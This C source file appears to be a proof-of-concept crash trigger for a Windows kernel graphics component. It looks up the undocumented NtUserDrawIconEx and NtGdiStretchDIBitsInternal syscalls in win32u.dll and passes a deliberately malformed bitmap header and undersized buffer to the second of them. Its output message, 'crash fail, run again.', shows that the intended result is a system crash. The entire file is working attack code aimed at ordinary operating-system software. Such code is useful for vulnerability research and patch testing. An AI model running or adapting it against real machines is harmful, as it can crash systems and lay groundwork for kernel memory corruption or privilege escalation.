#include <Windows.h>
#include <stdio.h>
#include <wingdi.h>
#include <winuser.h>

typedef NTSTATUS(WINAPI NtGdiStretchDIBitsInternal_t)(HDC hdc, 
	int xDst, 
	int yDst, 
	int cxDst, 
	int cyDst, 
	int xSrc, 
	int ySrc, 
	int cxSrc, 
	int cySrc, 
	LPBYTE pjInit, 
	LPBITMAPINFO pbmi, 
	DWORD dwUsage, 
	DWORD dwRop4, 
	UINT cjMaxInfo, 
	UINT cjMaxBits, 
	HANDLE hcmXform);

typedef NTSTATUS(WINAPI NtUserDrawIconEx_t)(HDC hdc,
	int xLeft,
	int yTop,
	HICON hIcon,
	int cxWidth,
	int cyHeight,
	UINT istepIfAniCur,
	HBRUSH hbrFlickerFreeDraw,
	UINT diFlags,
	BOOL bMetaHDC,
	PVOID pDIXData);


int main() {
	LoadLibrary(TEXT("user32"));
	NtUserDrawIconEx_t* NtUserDrawIconEx = (NtUserDrawIconEx_t*)GetProcAddress(GetModuleHandle(L"win32u.dll"), "NtUserDrawIconEx");
	if (NtUserDrawIconEx == NULL) {
		printf("error get function\n");
		return 0;
	}
	HDC screen = GetDC(NULL);
	printf("screen: 0x%p\n", screen);
	HDC destDC = CreateCompatibleDC(screen);
	printf("compatible: 0x%p\n", destDC);
	HBITMAP bmp = CreateCompatibleBitmap(screen, 1024, 768);

	SelectObject(destDC, bmp);
	int ret = SetStretchBltMode(destDC, HALFTONE);
	if (!ret) {
		printf("set mode error\n");
		return 0;
	}
	printf("pre mode: 0x%x\n", ret);
	ret = GetStretchBltMode(destDC);
	printf("now mode: 0x%x\n", ret);
	BOOL bRet = SetBrushOrgEx(destDC, 0x0, 0x0, NULL);
	if (!bRet) {
		printf("set brush org error\n");
		return 0;
	}
	HICON hIcon = LoadIcon(NULL, IDI_QUESTION);
	//__debugbreak();

	NtUserDrawIconEx(destDC, 0x10, 0x10, hIcon, 0x20, 0x20, 0x00, NULL, 0x01, FALSE, NULL);

	NtGdiStretchDIBitsInternal_t* NtGdiStretchDIBitsInternal = (NtGdiStretchDIBitsInternal_t*)GetProcAddress(GetModuleHandle(L"win32u.dll"), "NtGdiStretchDIBitsInternal");
	if (NtGdiStretchDIBitsInternal == NULL) {
		printf("error get function\n");
		return 0;
	}
	BITMAPINFO bminfo = { 0 };
	bminfo.bmiHeader.biSize = 0x30;
	bminfo.bmiHeader.biWidth = 0x80;
	bminfo.bmiHeader.biHeight = 0x80;
	bminfo.bmiHeader.biPlanes = 0xaa;
	bminfo.bmiHeader.biBitCount = 0x18;//0x4
	LPBYTE lpBits = (LPBYTE)malloc(0x1);
	ZeroMemory(lpBits, 0x1);
	//bminfo
	printf("now: 0x%p\n", destDC);
	//getchar();
	//__debugbreak();
	NtGdiStretchDIBitsInternal(destDC, 0x10, 0x10, 0x10, 0x10, 0x30, 0x50, 0x10, 0x20, (LPBYTE)lpBits, &bminfo, 0x1, 0xCC0000, 0x30, 0xD100, NULL);
	printf("crash fail, run again.\n");
	//StretchDIBits(hDC, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, &lpBits, &bminfo, 0x10, 0x10);
	//StretchBlt(hDC, 0x10, 0x10, 0x10, 0x10, NULL, 0x10, 0x10, 0x10, 0x10, 0x10);
	return 0;
}